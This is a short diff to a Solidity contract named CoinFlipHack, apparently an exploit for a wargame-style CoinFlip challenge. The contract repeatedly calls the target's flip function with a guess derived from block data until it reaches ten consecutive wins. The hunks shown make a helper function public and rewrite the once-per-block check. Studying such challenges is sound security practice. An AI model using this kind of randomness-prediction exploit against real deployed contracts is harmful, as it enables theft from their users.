@@ -14,7 +14,7 @@ contract CoinFlipHack {
         cp = CoinFlip(deployedAddress);
     }
 
-    function _getBlockMinusOne() private view returns (uint256) {
+    function getBlockMinusOne() public view returns (uint256) {
         return (block.number - 1);
     }
 
@@ -27,10 +27,8 @@ contract CoinFlipHack {
         until consecutive wins is equal to 10.
      */
     function checkBlock() public returns (bool) {
-        if (_getBlockMinusOne() == prevBlock) {
-            revert();
-        } else {
-            prevBlock = _getBlockMinusOne();
+        if (getBlockMinusOne() != prevBlock) {
+            prevBlock = getBlockMinusOne();
             _initHack();
         }
     }
@@ -42,7 +40,7 @@ contract CoinFlipHack {
         cp.flip.gas(1000000)(flipResult);
         return true;
     }
-    
+
     function getBalance() public view returns(uint){
       return address(this).balance;
     }
